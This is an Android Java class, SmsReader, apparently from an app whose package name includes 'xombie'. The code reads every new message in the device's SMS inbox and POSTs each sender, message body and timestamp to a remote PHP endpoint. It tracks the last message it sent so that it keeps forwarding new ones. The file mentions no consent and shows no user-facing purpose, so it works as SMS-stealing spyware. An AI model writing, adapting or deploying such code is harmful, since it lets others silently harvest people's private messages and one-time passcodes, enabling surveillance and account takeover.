package com.dawillygene.venlitgenexombiev2;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReader {
    private static final String TAG = "SmsReader";
    private static final String SERVER_URL = "https://dawillygene.co.tz/venlit2000/sms_receiver.php";
    private static final String LAST_PROCESSED_ID_KEY = "last_processed_sms_id";

    public static void readSms(Context context) {
        ContentResolver contentResolver = context.getContentResolver();
        Uri uri = Uri.parse("content://sms/inbox");
        String[] projection = { "_id", "address", "body", "date" };

        // Get the last processed SMS ID from SharedPreferences
        SharedPreferences prefs = context.getSharedPreferences("sms_prefs", Context.MODE_PRIVATE);
        String lastProcessedId = prefs.getString(LAST_PROCESSED_ID_KEY, null);

        String selection = null;
        String[] selectionArgs = null;

        // If we have a last processed ID, only get newer messages
        if (lastProcessedId != null) {
            selection = "_id > ?";
            selectionArgs = new String[]{lastProcessedId};
        }

        Cursor cursor = contentResolver.query(
                uri,
                projection,
                selection,
                selectionArgs,
                "date DESC"
        );

        String newestId = null;
        if (cursor != null && cursor.moveToFirst()) {
            do {
                String id = cursor.getString(cursor.getColumnIndex("_id"));
                newestId = id;
                String sender = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                long timestamp = cursor.getLong(cursor.getColumnIndex("date"));

                Log.d(TAG, "Processing SMS ID: " + id);
                sendSmsToServer(sender, body, timestamp);

            } while (cursor.moveToNext());

            cursor.close();

            // Save the newest processed ID
            if (newestId != null) {
                prefs.edit()
                        .putString(LAST_PROCESSED_ID_KEY, newestId)
                        .apply();
            }
        } else {
            Log.d(TAG, "No new SMS found in the inbox");
        }
    }

    private static void sendSmsToServer(String sender, String body, long timestamp) {
        new AsyncTask<String, Void, Void>() {
            protected Void doInBackground(String... params) {
                try {
                    URL url = new URL(SERVER_URL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setDoInput(true);

                    OutputStream os = conn.getOutputStream();
                    BufferedWriter writer = new BufferedWriter(
                            new OutputStreamWriter(os, "UTF-8"));
                    writer.write("sender=" + URLEncoder.encode(params[0], "UTF-8") +
                            "&body=" + URLEncoder.encode(params[1], "UTF-8") +
                            "&timestamp=" + params[2]);
                    writer.flush();
                    writer.close();
                    os.close();

                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        BufferedReader in = new BufferedReader(
                                new InputStreamReader(conn.getInputStream()));
                        String inputLine;
                        StringBuilder response = new StringBuilder();
                        while ((inputLine = in.readLine()) != null) {
                            response.append(inputLine);
                        }
                        in.close();
                        Log.d(TAG, "Server response: " + response.toString());
                    } else {
                        Log.e(TAG, "Server request failed with code: " + responseCode);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error sending SMS to server", e);
                }
                return null;
            }
        }.execute(sender, body, String.valueOf(timestamp));
    }
}